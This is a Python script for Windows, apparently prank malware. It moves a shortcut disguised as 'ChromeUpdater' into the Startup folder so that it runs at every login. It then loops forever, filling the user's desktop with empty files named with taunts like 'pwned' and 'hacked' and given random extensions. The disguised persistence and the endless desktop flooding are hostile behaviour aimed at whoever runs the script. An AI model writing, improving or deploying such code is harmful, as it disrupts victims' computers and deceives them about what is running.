#Created by 2Loop & CaptainBeluga
import random
import os
import winreg

def check_onedrive():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\OneDrive")
        winreg.QueryValueEx(key, "UserFolder")[0]
        return True

    except:
        return False


desk = ""
if(check_onedrive()):
    desk = "C:\\Users\\%username%\\OneDrive\\Desktop\\"

else:
    desk = "C:\\Users\\%username%\\Desktop\\"


os.system('move "C:\\Users\\%username%\\AppData\\Local\\Programs\\ChromeUpdater\\ChromeUpdater.lnk" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

extensions_list = ['pdf','txt','png','docx','xlsx','jpg','ini','pptx','dll','apk','mp4','zip','exe','mp3','dat','vbs','stl','fbx','iso','bat','cfg','md','dds','js','jpeg','png','html','css']
names_list = ['astri', 'beluga', 'XDDDD', '6969', 'fucked', 'imagine', 'defalt','watch-dogs','fortnite','vbuck-kid','scammer','pwned',"cript","notgaio","gayfriendly","hacked","bruh"]

while True:
    #Generation process
    name = random.choice(names_list)
    extension = random.choice(extensions_list)

    result = f'{name}.{extension}'

    os.system(f"echo off > {desk}/{result}")

    print(f'[+] File generated > {result}')